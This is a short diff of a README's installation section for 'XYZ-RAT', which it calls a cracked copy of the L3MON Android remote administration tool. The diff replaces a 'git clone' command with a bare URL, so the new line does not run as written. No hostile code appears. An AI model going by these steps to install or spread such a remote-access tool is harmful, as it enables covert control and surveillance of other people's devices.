@@ -25,7 +25,7 @@ Cracked of real <a href="https://github.com/D3VL/L3MON">L3MON</a> a cloud based 
 ## Installation
 
      cd $HOME
-     git clone https://github.com/rootuserdj/XYZ-RAT.git
+     https://github.com/SETU-xyz/XYZ-RAT.git
      cd XYZ-RAT
      bash install.sh
 
